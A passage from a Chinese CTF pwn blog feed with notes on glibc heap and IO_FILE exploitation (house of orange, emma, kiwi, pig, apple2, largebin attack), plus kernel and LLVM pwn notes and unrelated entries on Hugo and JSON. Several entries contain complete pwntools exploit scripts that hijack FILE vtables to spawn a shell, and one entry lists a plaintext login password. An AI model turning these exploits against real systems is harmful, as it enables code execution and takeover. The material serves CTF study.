&lt;_IO_switch_to_wget_mode+32&gt; mov esi, 0xffffffff 调用_wide_data-&gt;vtable+0x18处的函数 0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt; call qword ptr [rax + 0x18] 函数调用链 _IO_wfile_jumps _IO_wfile_seekoff _IO_switch_to_wget_mode 需要注意设置的几个值 fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base wide_data+0x20&gt;wide_data+0x18 fake_file+0xa0也就是wide_data设置为一个堆地址 wide_data+0xe0设置为一个地址C，让该地址C+0x18为一个函数，一般为setcontext+61   ]]></content></entry><entry><title>house of emma</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-emma/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>house系列</tag></tags><content type="html"> [TOC] 参考文章 例题详解 _IO_cookie_jumps中的_IO_cookie_write，_IO_cookie_write又会调用 cookie_io_functions_t __io_functions中的函数
使用条件 可以任意写一个可控地址（LargeBin Attack、Tcache Stashing Unlink Attack…） 可以触发 IO 流（FSOP、House OF Kiwi） 利用原理 寻找合法的 vtable _IO_jump_t 结构体的一个实例，类似house of pig的_IO_str_jumps
static const struct _IO_jump_t _IO_cookie_jumps libio_vtable = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_file_finish), 0x18 JUMP_INIT(overflow, _IO_file_overflow), JUMP_INIT(underflow, _IO_file_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_default_pbackfail), JUMP_INIT(xsputn, _IO_file_xsputn), JUMP_INIT(xsgetn, _IO_default_xsgetn), JUMP_INIT(seekoff, _IO_cookie_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_file_setbuf), 0x60 JUMP_INIT(sync, _IO_file_sync), 0x68 JUMP_INIT(doallocate, _IO_file_doallocate), 0x70 JUMP_INIT(read, _IO_cookie_read), 0x78 JUMP_INIT(write, _IO_cookie_write), 0x80 JUMP_INIT(seek, _IO_cookie_seek), 0x88 JUMP_INIT(close, _IO_cookie_close), …</content></entry><entry><title>house of husk</title><url>/post/%E5%A0%86%E6%9D%82%E8%AE%B0/house-of-husk/</url><categories><category>PWN</category><category>堆杂记</category></categories><tags><tag>house of husk</tag></tags><content type="html"><![CDATA[   参考博客1 参考博客2 效果是执行一次call，一般都是打ogg 这个spec对应的字符对应的偏移就是其ASCII码
漏洞原理 ​printf​ 函数通过检查 __printf_function_table​ 是否为空，来判断是否有自定义的格式化字符 若为printf类格式字符串函数，则会根据格式字符串的种类去执行 __printf_arginfo_table[spec]​ 处的函数指针 劫持方法 劫持 __printf_function_table​ 使其非空 劫持 __printf_arginfo_table​ 使其表中存放的 spec​ 的位置是后门或者我们的构造的利用链 执行到 printf​ 函数时就可以将执行流劫持程序流 spec是格式化字符，比如最后调用的是 printf(&amp;quot;%s\n&amp;quot;,a)​,那么应该将 __printf_arginfo_table[73]​ 的位置（即&amp;amp;__printf_arginfo_table+0x73*8处）写入我们想要执行的地址 调用链 printf vfprintf printf_positional __parse_one_specmb (*__printf_arginfo_table[spec-&amp;gt;info.spec]) 例题 husk 题目链接 这个题是静态链接的，和后面一题有些不同 from pwn import* from pwnlib.util.packing import u64 from pwnlib.util.packing import p64 context(os=&amp;#39;linux&amp;#39;, arch=&amp;#39;amd64&amp;#39;, log_level=&amp;#39;debug&amp;#39;) p=process(&amp;#39;/home/zp9080/PWN/husk&amp;#39;) &amp;#39;&amp;#39;&amp;#39; stack_chk_fail()会将libc_argv[0]指向的字符串打印出来,我们将__libc_argv[0]内容修改为flag的地址 再将printf_function_table置为非空,printf_arginfo_table[spec]篡改为__stack_chk_fail()来打印flag &amp;#39;&amp;#39;&amp;#39; …  ]]></content></entry><entry><title>house of kiwi</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-kiwi/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>house系列</tag></tags><content type="html"><![CDATA[  [TOC] 参考文章 例题讲解 例题讲解 _IO_file_jumps中的_IO_file_sync
前言 加沙盒的题目,在2.29之后的堆题中,通常为以下两种方式
劫持__free_hook,利用特定的gadget,将栈进行迁移 劫持__malloc_hook为setcontext+61的gadget,以及劫持IO_list_all单链表中的指针在exit结束中,在_IO_cleanup函数会进行缓冲区的刷新,从而读取flag 因为setcontext + 61从2.29之后变为由RDX寄存器控制寄存器了,所以需要控制RDX寄存器的指向的位置的部分数据 但是上述两种方法都有缺陷，如果将exit函数替换成_exit函数,最终结束的时候,则是进行了syscall来结束,并没有机会调用_IO_cleanup，上述方法就失效了。在glibc2.34移除了hook，上述方法也用不了。因此引入house of kiwi这种方法 &amp;lt;setcontext+61&amp;gt;: mov rsp,QWORD PTR [rdx+0xa0] &amp;lt;setcontext+68&amp;gt;: mov rbx,QWORD PTR [rdx+0x80] &amp;lt;setcontext+75&amp;gt;: mov rbp,QWORD PTR [rdx+0x78] &amp;lt;setcontext+79&amp;gt;: mov r12,QWORD PTR [rdx+0x48] &amp;lt;setcontext+83&amp;gt;: mov r13,QWORD PTR [rdx+0x50] &amp;lt;setcontext+87&amp;gt;: mov r14,QWORD PTR [rdx+0x58] &amp;lt;setcontext+91&amp;gt;: mov r15,QWORD PTR [rdx+0x60] &amp;lt;setcontext+95&amp;gt;: test DWORD PTR fs:0x48,0x2 &amp;lt;setcontext+107&amp;gt;: je 0x7ffff7e31156 &amp;lt;setcontext+294&amp;gt; &amp;lt;setcontext+294&amp;gt;: mov rcx,QWORD PTR [rdx+0xa8] &amp;lt;setcontext+301&amp;gt;: push rcx …  ]]></content></entry><entry><title>house of orange</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-orange/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>house系列</tag></tags><content type="html"><![CDATA[  [TOC] 参考博客 攻击分析 修改top chunk的size，然后add一个大于top chunk size的chunk让top chunk进入unsorted bin,注意top chunk的inuse要为1，同时注意页对齐 利用unsorted bin attack往_IO_list_all写入main_arena+88或main_arena+96，这个地址+0x68的位置（.chain）的值刚好是smallbin 0x60大小的堆块 因此修改刚才的unsorted bin chunk的size为0x61,然后add 一个比它大的chunk让这个chunk进入smallbin。 剩下的就是布置FAKE FILE打FSOP，注意libc2.23的vtable检查不严格，因此可以布置为一个堆地址，然后这个堆地址+0x18为system就行了(_IO_OVERFLOW的位置) 例题 海洋大学第九届信息安全竞赛 orange
题目分析 题目可以free一次，并且有off-by-one，add的大小为size &lt; 0xe0 || size &gt; 0x3e0 这个题的off-by-one用法和以前见的都不一样，这里是通过off-by-one让top chunk的地址降低，然后就可以用chunk2来edit top chunk因此实现了house of orange攻击 exp from pwn import * from pwnlib.util.packing import u64 from pwnlib.util.packing import p64 from pwnlib.util.packing import p32 context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;) p=process(&#34;/home/zp9080/PWN/orange&#34;) # p = remote(&#39;competition.blue-whale.me&#39;, 20918) libc=ELF(&#34;/home/zp9080/PWN/libc-2.23.so&#34;) def add(idx,size): p.sendlineafter(b&#34;4.show\n&#34;,b&#34;1&#34;) p.sendlineafter(b&#34;which index?\n&#34;,bytes(str(idx), &#39;ascii&#39;)) p.sendlineafter(b&#34;what size?\n&#34;,bytes(str(size), &#39;ascii&#39;)) def free(idx): p.sendlineafter(b&#34;4.show\n&#34;,b&#39;2&#39;) p.sendlineafter(b&#34;which index?\n&#34;,bytes(str(idx), &#39;ascii&#39;)) p.recvuntil(b&#39;this is you want to delete: &#39;) return int(p.recv(14),16) def edit(idx,content): p.sendlineafter(b&#34;4.show\n&#34;,b&#39;3&#39;) p.sendlineafter(b&#34;which index?\n&#34;,bytes(str(idx), &#39;ascii&#39;)) p.sendlineafter(b&#34;content:\n&#34;,content) def show(idx): p.sendlineafter(b&#34;4.show\n&#34;,b&#39;4&#39;) p.sendlineafter(b&#34;which index?\n&#34;,bytes(str(idx), &#39;ascii&#39;)) def dbg(): gdb.attach(p,&#39;b *$rebase(0xFC4)&#39;) pause() add(6,0x1a0) add(7,0x170) add(8,0xe0) add(10,0x380) add(9,0x380) # above for padding add(0,0xe8) add(1,0xf0) add(2,0xe0) payload=b&#39;a&#39;*0xe8+b&#39;\xf1&#39; edit(0,payload) #注意free时会通过chunk自身的size去找next chunk判断Inuse位 heap_base=free(1)-0xc40 #会和top chunk合并，让top chunk的地址变低，因此此时的堆风水是chunk2可以编辑top chunk success(&#34;heap_base -&gt; {:#x}&#34;.format(heap_base)) add(1,0x100) payload2=p64(0)+p64(0x2c1) edit(2,payload2) #泄露libcbase add(3,0x380) #此时top chunk进入unsorted bin payload3=b&#39;b&#39;*(0x10-1) edit(2,payload3) show(2) libc_base=u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-88- 0x10 -libc.symbols[&#39;__malloc_hook&#39;] success(&#34;libc_base -&gt; {:#x}&#34;.format(libc_base)) io_list_all_addr=libc_base+libc.symbols[&#39;_IO_list_all&#39;] system_addr=libc_base+libc.symbols[&#39;system&#39;] #打house of orange payload = b&#34;Y&#34;*0x10 flag = b&#39;/bin/sh\x00&#39; heap=heap_base+0xe10-0x18 fake_size = p64(0x61) fd = p64(0) bk = p64(io_list_all_addr - 0x10) write_base = p64(1) write_ptr = p64(2) mode = p32(0) vtable = p64(heap) overflow = p64(system_addr) payload = flag payload = payload + fake_size payload = payload + fd payload = payload + bk payload = payload + write_base payload = payload + write_ptr payload = payload + p64(0)*18 #注意这里的p64(0)*18，不要看错了 payload = payload + mode + p32(0) + p64(0) + overflow payload = payload + vtable edit(2,payload) add(4,0x100) p.interactive()   ]]></content></entry><entry><title>house of orange新理解</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/house-of-orange%E6%96%B0%E7%90%86%E8%A7%A3/</url><categories><category>PWN</category><category>堆攻击旧版</category></categories><tags><tag>house of orange新理解</tag></tags><content type="html"> house of orange攻击流程没什么好说的，但笔者之前一直认为就只是把top chunk放入unsorted bin，然后修改unsorted bin的bk为IO_list_all-0x10，之后add一个大的chunk实现unsorted bin attack的同时出发malloc_assert直接走IO拿到shell 这里以WUKONG CTF2024 ezheap为例记录一下新的理解 题目分析 Partial RELRO，NO PIE ，libc2.23 add和edit都有0x1000的长度，很明显的溢出。没有delete，同时show只能show前8个字节 显然要用house of orange来泄露libcbase，但是究竟如何泄露heapbase感觉有些困难 官方wp 泄露libcbase还是利用house of orange 但是不要把思维局限了，这个题还有个NO PIE 限制，那么就可以把unsorted bin的bk修改为chunklist加减偏移，这样bss段是可写的，malloc之后也不会有malloc_assert触发，同时可以edit unsorted bin，那么泄露了heapbase后还可以继续申请堆块，那么就可以继续打原来的IO了 最终效果如图所示 非预期解 在mmap区域构造top chunk，同时再add一个比top chunk大的chunk来让这个top chunk进入fastbin 错位构造打malloc_hook然后ogg 可以发现house of orange让top chunk进入unsorted bin会让其size减少0x20,后面构造的时候也要注意 这里已经是在mmap区域伪造top chunk了，要注意这里也要注意0x1000对齐 再add一个比0x90大的chunk，那么这个top chunk就会进入fastbin 这里就可以不用再打IO了，直接打错位构造打malloc_hook然后ogg 自己的解法 注意到这里的chunk_size还有一个字节的溢出 那么这个就可以修改chunk0的最低一个字节，那么这里就可以修改ck0然后show前8个字节就能得到heapbase 同时注意到通过扩展top chunk得到的区域距离堆的偏移是一定的，同时idx还是没有上限的!!! 这里就可以通 …</content></entry><entry><title>house of pig</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-pig/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>house系列</tag></tags><content type="html"> [TOC] 原理详解 题目详解 _IO_str_jumps中的_IO_str_overflow
核心 利用_IO_str_overflow的malloc,memcpy,free三连，设置FAKE_FILE的值，使得free_hook被覆盖为system函数，最后free就可以拿到shell，怎么设置看源代码的函数执行流程
例题 house of pig 主要是利用了largebin attack,tcache stashing unlink attack，伪造FILE结构等手法
题目分析： 这个题是个C++代码，对于笔者分析还是有不小难度，但是对于逆向来说，我们不要在乎那么多细节，抓住核心利用点，这才是关键。 这个题用栈来存储chunk的相关数据，与之前总是用全局变量来存储有所不同，所以一开始看的我很晕，而且ida反汇编C++的东西又不好看，导致很多时间在纠结一些细节，但不要忘记堆就几个关键，chunklist,sizelist,marklist，这个题也不例外，抓住这点就够了 这个题在change role时候把原本的chunk相关数据copy到mmap_addr，但是没有copy完全，这就是漏洞利用点。可以很明显看到edit,show都是只看mark1,不看mark2,但是copy没有拷贝mark1中的数据，那么再次切换回来就会让mark1=0（因为mmap中的数据本身就是0），这就有了uaf peppa(A) 0-19 calloc(0x90-0x430) mummy(B) 0-9 calloc(0x90-0x450) daddy(C) 0-4 calloc(0x90-0x440) if(add&amp;amp;amp;&amp;amp;amp;i==4) 再malloc(0xe8) 这个题还有个点要注意，平时read都是可以控制整个mem区域，但这个题又做了一个限制。把控制的mem以每0x30为一块，A只可写每块的0-0x10,B只可写每块的0x10-0x20,C只可写每块的0x20-0x30。虽然做了限制，但是也给人启发，A相当于控制fd,bk;B相当于控制fd_nextsize,bk_nextsize 攻击流程 为tcache stashing unlink attack做准备，tcache中5个，smallbin中2个，大小都为0xa0 利用largebin泄 …</content></entry><entry><title>house of pig plus</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-pig-plus/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>house系列</tag></tags><content type="html"><![CDATA[  [TOC] 参考博客 当题目中限制了system函数的调用，可以使用此方法进行orw，但是这个方法的前提还是有hook可打
特别之处 IO_str_overflow中一个特别之处 mov rdx,QWORD PTR [rdi+0x28]这条汇编指令，此时的rdi恰好指向我们伪造的IO_FILE_plus的头部,使得可以进行rdx的设置，进而可以使用setcontent函数进行srop 0x7ffff7e6eb20 &amp;lt;__GI__IO_str_overflow&amp;gt;: repz nop edx 0x7ffff7e6eb24 &amp;lt;__GI__IO_str_overflow+4&amp;gt;: push r15 0x7ffff7e6eb26 &amp;lt;__GI__IO_str_overflow+6&amp;gt;: push r14 0x7ffff7e6eb28 &amp;lt;__GI__IO_str_overflow+8&amp;gt;: push r13 0x7ffff7e6eb2a &amp;lt;__GI__IO_str_overflow+10&amp;gt;: push r12 0x7ffff7e6eb2c &amp;lt;__GI__IO_str_overflow+12&amp;gt;: push rbp 0x7ffff7e6eb2d &amp;lt;__GI__IO_str_overflow+13&amp;gt;: mov ebp,esi 0x7ffff7e6eb2f &amp;lt;__GI__IO_str_overflow+15&amp;gt;: push rbx 0x7ffff7e6eb30 &amp;lt;__GI__IO_str_overflow+16&amp;gt;: sub rsp,0x28 0x7ffff7e6eb34 &amp;lt;__GI__IO_str_overflow+20&amp;gt;: mov eax,DWORD PTR [rdi] 0x7ffff7e6eb36 &amp;lt;__GI__IO_str_overflow+22&amp;gt;: test al,0x8 0x7ffff7e6eb38 &amp;lt;__GI__IO_str_overflow+24&amp;gt;: jne 0x7ffff7e6eca0 &amp;lt;__GI__IO_str_overflow+384&amp;gt; 0x7ffff7e6eb3e …  ]]></content></entry><entry><title>hugo博客搭建</title><url>/post/%E7%AC%94%E8%AE%B0/hugo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url><categories><category>笔记</category></categories><tags/><content type="html"><![CDATA[   hugo博客搭建超详细教程 hugo主题选择 如果E:\Project\Blog\ZER0-blog\public\img\author.jpg 和 http://localhost:1313/img/author.jpg 访问的图片不一致，可能是因为图片缓存 浏览器可能缓存了旧版本的图片，导致显示的图片与实际文件不一致。尝试以下步骤清除缓存： 强制刷新：按 Ctrl + F5（或 Cmd + Shift + R 在 macOS 上）强制刷新页面，确保加载最新的资源。
想要让自己首页home目录下显示东西，应该修改的是/layouts/index.html，这可能是hugo到时候解析会把这个放在首页
想要换背景图片，主要是修改/layouts/index.html和/layouts/_default/baseof.html
搭建博客时要修改文件路径，这里可以用windows-powershell中的功能,直接替换字符（但前提是你之前本地笔记都很规整。发现photos目录会因为这个操作图片被损坏，但是无所谓了，注意提前备份就行）
$folderPath = &amp;#34;C:\Users\ZP\Desktop\PWN3&amp;#34; $searchPattern = &amp;#34;*.*&amp;#34; Get-ChildItem -Path $folderPath -Recurse -Include $searchPattern | ForEach-Object { try { # 读取文件内容，使用 UTF-8 编码 $content = Get-Content $_.FullName -Raw -Encoding UTF8 -ErrorAction Stop # 替换 /photos 为 /img/photos $content = $content -replace &amp;#34;/photos&amp;#34;, &amp;#34;/imgs/photos3&amp;#34; # 写入文件内容，使用 UTF-8 编码 $content | Set-Content $_.FullName -Encoding UTF8 } catch { Write-Host &amp;#34;无法访问文件：$($_.FullName)&amp;#34; -ForegroundColor Red } } 本地笔记都没有Hugo的前缀，这 …  ]]></content></entry><entry><title>io basic knowledge</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/io-basic-knowledge/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>io basic knowledge</tag></tags><content type="html"><![CDATA[  [TOC] _IO_list_all、 _IO_2_1_stderr、 stderr
FSOP FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的_IO_FILE 结构会使用_chain 域相互连接形成一个链表，这个链表的头部由_IO_list_all 维护。 FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow typedef int (*_IO_overflow_t) (FILE *, int); #define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) #define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&amp;gt;FUNC) (THIS, X1) # define _IO_JUMPS_FUNC(THIS) \ (IO_validate_vtable \ (*(struct _IO_jump_t **) ((void *) &amp;amp;_IO_JUMPS_FILE_plus (THIS)	\ + (THIS)-&amp;gt;_vtable_offset))) #define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&amp;gt;FUNC) (THIS, X1) #define _IO_WIDE_JUMPS(THIS) \ _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&amp;gt;_wide_vtable _IO_flush_all_lockp #define _IO_OVERFLOW(FP, CH) …  ]]></content></entry><entry><title>json格式</title><url>/post/%E6%9D%82%E4%B9%B1%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/json/</url><categories><category>杂乱的知识点</category></categories><tags/><content type="html"><![CDATA[  JSON 常见格式 1.简单对象 { &#34;name&#34;: &#34;John Doe&#34;, &#34;age&#34;: 30, &#34;is_student&#34;: false } 这是一个包含三个键值对的简单对象。
2.嵌套对象 { &#34;person&#34;: { &#34;name&#34;: &#34;John Doe&#34;, &#34;age&#34;: 30, &#34;address&#34;: { &#34;street&#34;: &#34;123 Main St&#34;, &#34;city&#34;: &#34;Anytown&#34;, &#34;country&#34;: &#34;USA&#34; } } } 在这个示例中，一个对象包含另一个对象作为其值。
3.数组 { &#34;fruits&#34;: [&#34;apple&#34;, &#34;banana&#34;, &#34;cherry&#34;] } 4.对象数组 { &#34;employees&#34;: [ { &#34;name&#34;: &#34;John Doe&#34;, &#34;age&#34;: 30 }, { &#34;name&#34;: &#34;Jane Smith&#34;, &#34;age&#34;: 25 }, { &#34;name&#34;: &#34;Emily Johnson&#34;, &#34;age&#34;: 35 } ] } 5.布尔值和空值 { &#34;success&#34;: true, &#34;data&#34;: null } 6.复杂示例 { &#34;id&#34;: 1, &#34;name&#34;: &#34;Product&#34;, &#34;price&#34;: 29.99, &#34;tags&#34;: [&#34;electronics&#34;, &#34;sale&#34;], &#34;attributes&#34;: { &#34;color&#34;: &#34;red&#34;, &#34;warranty&#34;: &#34;1 year&#34; }, &#34;in_stock&#34;: true, &#34;related_products&#34;: [ { &#34;id&#34;: 2, &#34;name&#34;: &#34;Related Product 1&#34; }, { &#34;id&#34;: 3, &#34;name&#34;: &#34;Related Product 2&#34; } ] } JSON格式的基本规则 对象由花括号 {} 包围，包含零个或多个键值对。 数组由方括号 [] 包围，包含零个或多个值。 键必须是字符串，且必须用双引号 &quot;&quot; 包围。 值可以是字符串（必须用双引号包围）、数字、对象、数组、布尔值（true 或 false）或 null。   ]]></content></entry><entry><title>kali</title><url>/post/tools/kali/</url><categories><category>Tools</category></categories><tags><tag>tools</tag></tags><content type="html"> 账号:zzzp 密码：20040918 安装vmmare</content></entry><entry><title>kernel pwn基础知识</title><url>/post/kernel-pwn/kernel-pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url><categories><category>PWN</category><category>Kernel Pwn</category></categories><tags><tag>kernel pwn</tag></tags><content type="html"> [TOC]
通用保护机制 KASLR FGKASLR STACK PROTECTOR SMAP/SMEP KPTI 内核 “堆” 上保护机制 Hardened Usercopy Hardened freelist Random freelist CONFIG_INIT_ON_ALLOC_DEFAULT_ON 调试相关 在启动sh脚本后加上 -gdb tcp::1234 ，然后在pwndbg中target remote 127.0.0.1 1234</content></entry><entry><title>largebin attack</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/largebin-attack/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>largebin attack</tag></tags><content type="html"><![CDATA[  [TOC] 学习时参考的博客 博客1 博客2 往一个地址写入一个堆地址 largebin attack经常用来在堆上伪造FAKE FILE来打IO_FILE
代码 malloc(0x420) #0 malloc(0x20) malloc(0x410) #1 malloc(0x20) free(0) #让0进入largebin malloc(0x430) #1在unsorted bin中 free(1) #size(0)&amp;gt;size(1) edit(0,p64(0)*3+p64(target-0x20)) #触发largebin attack malloc(0x430) #修改largebin edit(0,p64(recover)*2) 做题笔记 largebin attack了_IO_list_all后一般largebin都是ck2-&amp;gt;ck1，然后IO_list_all指向ck1,但是有时候edit次数有限制，所以可以这样做
在edit ck2的bk_nextsize的时候，直接把IO布置到ck2上，largebin attack后IO_list_all指向ck1,但是再把ck1给add出来，那么此时因为出入bin的原因，IO_list_all最终指向ck2，那么就是一次edit直接打完largebin attack同时布置好了IO
shellcode=asm(shellcraft.openat2(-100,flag_addr,flag_addr+0x1000,0x18)+shellcraft.read(3,heapbase+0x10000,0x50)+shellcraft.write(1,heapbase+0x10000,0x50)+shellcraft.exit(0)) orw_rop = b&amp;#39;flag\x00\x00\x00\x00&amp;#39; orw_rop += p64(pop_rdx_r12_ret) + p64(0) + p64(fake_IO_addr - 0x10) orw_rop += p64(pop_rdi_ret) + p64(heapbase) +p64(pop_rsi_ret)+p64(0x10000)+p64(pop_rdx_r12_ret)+p64(7)*2+ p64(libcbase + …  ]]></content></entry><entry><title>libc got</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/libc-got/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>libc got</tag></tags><content type="html"> [TOC] 参考博客 其实没什么特别的，现在主流的打法就是puts函数会调用libc中got.plt的strlen函数，而strlen的got表可以被我们修改，所以strlen(buf)就有点像hook一样可以打 最好用ida查看偏移 这个方法目前还没打过，感觉还是IO是主流打法，一般是无法进行largebin attack只能打fastbin attack和tcache attack才用此方法</content></entry><entry><title>libc2.39堆攻击</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/libc2.39%E5%A0%86%E6%94%BB%E5%87%BB/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>libc2.39堆攻击</tag></tags><content type="html"><![CDATA[   打litctf2024的时候遇到了一个libc2.39的堆，还是用house of apple2这个链打，但是有一点不同，这里做一下记录 主要是发现fake_io_addr+0x88要是一个可写地址才行，之前没有这个要求，具体原因如图 然后就正常进入IO_OVERFLOW打IO exp from pwn import * from pwnlib.util.packing import u64 from pwnlib.util.packing import u32 from pwnlib.util.packing import u16 from pwnlib.util.packing import u8 from pwnlib.util.packing import p64 from pwnlib.util.packing import p32 from pwnlib.util.packing import p16 from pwnlib.util.packing import p8 import base64 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) # p=remote(&#39;node3.anna.nssctf.cn&#39;,28087) p=process(&#34;/home/zp9080/PWN/heap&#34;) # NSSCTF{af15dc69-ec2d-41d5-9a44-8a57bf1178a3} elf = ELF(&#34;/home/zp9080/PWN/heap&#34;) libc=elf.libc def dbg(): gdb.attach(p,&#39;b *$rebase(0x17C6)&#39;) pause() menu=&#39;&gt;&gt;&#39; def add(idx,size): p.sendlineafter(menu,str(1)) p.sendlineafter(&#34;idx? &#34;,str(idx)) p.sendlineafter(&#34;size? &#34;,str(size)) def delete(idx): p.sendlineafter(menu,str(2)) p.sendlineafter(&#34;idx? &#34;,str(idx)) def show(idx): p.sendlineafter(menu,str(3)) p.sendlineafter(&#34;idx? &#34;,str(idx)) def edit(idx,cont): p.sendlineafter(menu,str(4)) p.sendlineafter(&#34;idx? &#34;,str(idx)) p.sendafter(&#34;content : &#34;,cont) add(0,0x420) add(15,0x488) add(1,0x410) add(14,0x500) delete(0) add(2,0x500) show(0) libcbase=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))-0x203f10 print(hex(libcbase)) edit(0,b&#39;a&#39;*16) show(0) p.recvuntil(b&#39;a&#39;*16) heapbase=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))-0x290 print(hex(heapbase)) edit(0,p64(libcbase+0x203f10)*2) #largebin attack io_list_all=libcbase+libc.sym[&#39;_IO_list_all&#39;] target=io_list_all delete(1) edit(0,p64(0)*3+p64(target-0x20)) add(3,0x500) rdi=libcbase+0x10f75b rsi=libcbase+0x110a4d ret=libcbase+0x2882f system_addr=libcbase+libc.sym[&#39;system&#39;] payload= b&#39; sh;\x00\x00\x00&#39;+p64(0) payload += p64(0) + p64(system_addr) + p64(1) + p64(2) #这样设置同时满足fsop payload = payload.ljust(0x48, b&#39;\x00&#39;) + p64(heapbase) #FAKE FILE+0x48 payload = payload.ljust(0x88,b&#39;\x00&#39;)+p64(heapbase+0x4000) payload = payload.ljust(0xa0, b&#39;\x00&#39;) + p64(heapbase+0x001ea0+0x10) #_wide_data payload = payload.ljust(0xd8, b&#39;\x00&#39;) + p64(libcbase + libc.sym[&#39;_IO_wfile_jumps&#39;]) #vtable=_IO_wfile_jumps edit(1,payload[16:]) edit(15,b&#39;a&#39;*0x480+b&#39; sh;\x00\x00\x00&#39;) wide_data=b&#39;\x00&#39; wide_data=wide_data.ljust(0x68,b&#39;\x00&#39;) wide_data+=p64(system_addr) wide_data=wide_data.ljust(0xe0,b&#39;\x00&#39;) wide_data+=p64(heapbase+0x001ea0+0x10) add(4,0x450) edit(4,wide_data) dbg() p.sendlineafter(menu,str(5)) p.interactive()   ]]></content></entry><entry><title>linux基础</title><url>/post/linux-basic-knowledge/linux%E5%9F%BA%E7%A1%80/</url><categories><category>Linux Basic Knowledge</category></categories><tags/><content type="html"> linux基础 Linux基础 网络问题：换源 网站链接 man(man 指令) /tldr(与man基本类似，只不过显示的东西更加简洁) Linux 系统目录结构 | 菜鸟教程 (runoob.com) 文件目录结构 权限 包管理器——依赖处理 命令行 the-art-of-command-line/README-zh.md at master · jlevy/the-art-of-command-line (github.com) 终端复用工具：tmux/zellij/screen 网站链接链接 无法生成core文件 chatgpt给的方法： 编辑 /etc/security/limits.conf 文件： 在文件中添加以下两行来将核心转储文件的限制设置为无限制： soft core unlimited hard core unlimited 确保对该文件的更改能够生效，您可能需要注销并重新登录您的用户会话，或者重新加载配置文件。 检查 /etc/sysctl.conf 文件及 /etc/sysctl.d/ 目录中的配置： 检查这些文件中是否存在与核心转储文件相关的设置，确保没有将核心转储文件的生成禁用或限制到一个非常小的大小。 您可以使用以下命令来查看文件内容： sudo vim /etc/sysctl.conf ls /etc/sysctl.d/ 修改 /etc/sysctl.conf 文件来设置核心转储文件的保存路径和文件名格式： 使用文本编辑器打开 /etc/sysctl.conf 文件，添加以下行来设置核心转储文件的保存路径和文件名格式： kernel.core_pattern = /var/core/core.%e.%p kernel.core_uses_pid = 1 kernel.core_dump = 1 保存文件并重新加载内核参数配置，以使新的设置生效： sudo sysctl &amp;ndash;system 确保允许生成核心转储文件的限制已经设置为无限制： 使用 ulimit -c unlimited 命令来将允许生成核心转储文件的大小限制设置为无限制。 确保在执行您的程序之前，核心转储文件大小限制已经正确地设置为无限制。 自己发现的方法： sudo vim ~/.bashrc 添加上ulimit -c unlimited</content></entry><entry><title>llvm-pwn</title><url>/post/llvm-pwn/llvm-pwn/</url><categories><category>PWN</category><category>LLVM Pwn</category></categories><tags><tag>llvm pwn</tag></tags><content type="html"> [TOC] 主要参考了此篇 博客 核心思路 其实llvm pass最主要的是pwn opt这个文件，同时其一般都是no pie,Partial RELRO,因此通常可以通过覆写got表实现任意函数执行 执行opt文件中会先执行libLLVM-8.so.1文件中的函数，libLLVM-8.so.1会将自定义的.so文件加载进来，并且执行.so文件里面的一些函数，这就是llvm pass opt-8 -load ./xxx.so -xxx ./exp.ll 有关.so文件 llvm pwn的漏洞一般都是重写了FunctionPass类中的runOnFunction函数，因此要先在.so文件找到重写函数 有时候发现在.load段 还有一种方法是可通过对__cxa_atexit函数“交叉引用”来定位，感觉没有第一个方便因此不再记录 有关gdb调试 opt并不会一开始就将so模块加载进来，因此想要gdb来调试需要等待.so文件加载好。这里有一个思路，先disass 